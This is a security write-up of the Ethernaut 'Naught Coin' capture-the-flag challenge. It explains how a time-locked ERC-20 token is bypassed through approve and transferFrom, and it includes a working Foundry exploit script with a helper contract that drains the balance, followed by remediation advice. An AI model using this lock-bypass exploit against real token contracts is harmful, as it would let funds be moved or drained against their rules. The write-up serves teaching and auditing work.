# Naught Coin — Security Writeup

| | |
|---|---|
| **Challenge** | [Ethernaut 16 — Naught Coin](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-naught-coin) |
| **Platform** | Smart Contracts Hacking (SCH) / OpenZeppelin Ethernaut |
| **Target** | `src/NaughtCoin.sol` |
| **Solidity** | `^0.8.0` |
| **Severity** | Critical (lock bypass) |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

`transfer` is blocked until `timeLock` (~10 years). `approve` and `transferFrom` are not. Approving a helper and calling `transferFrom` moves the entire player balance immediately.

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | Player balance is 0 | `naughtCoinInstance.balanceOf(PLAYER_ADDRESS) == 0` |

---

## Finding

### [C-01] Incomplete time lock on ERC-20 surface

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **Bug class** | Incomplete access control / lock bypass |
| **Location** | `transfer` locked; `transferFrom` unlocked |

#### Proof of concept

```bash
cd web3-ctf-challenges/16-ethernaut-naught-coin
forge test --match-test testExploit -vv
```

---

## Exploit implementation

### SCH (`Exploit.s.sol`)

```solidity
contract HelperContract {
    function drain(address token, address player, uint256 amount) external {
        (bool ok,) = token.call(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", player, address(this), amount)
        );
        require(ok, "transferFrom failed");
    }
}

function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    uint256 bal = naughtCoinInstance.balanceOf(PLAYER_ADDRESS);
    HelperContract helper = new HelperContract();
    naughtCoinInstance.approve(address(helper), bal);
    helper.drain(address(naughtCoinInstance), PLAYER_ADDRESS, bal);

    vm.stopBroadcast();
}
```

Instance name: `naughtCoinInstance` (same camel pattern as `gatekeeperTwoInstance`).

---

## Remediation

Apply the same lock (or vesting rules) to every balance-mutating path: `transfer`, `transferFrom`, and any burn/mint helpers. Prefer a dedicated vesting contract over a partial ERC-20 override.

---

## Key lessons

1. **Lock the whole surface** — not just `transfer`
2. **ERC-20 has two move paths** — both must honor policy
3. **`approve` is not harmless** when `transferFrom` is unlocked

---

## References

- [SCH Naught Coin](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-naught-coin)
- Local: `Exploit.s.sol`, `test/NaughtCoinExploit.t.sol`
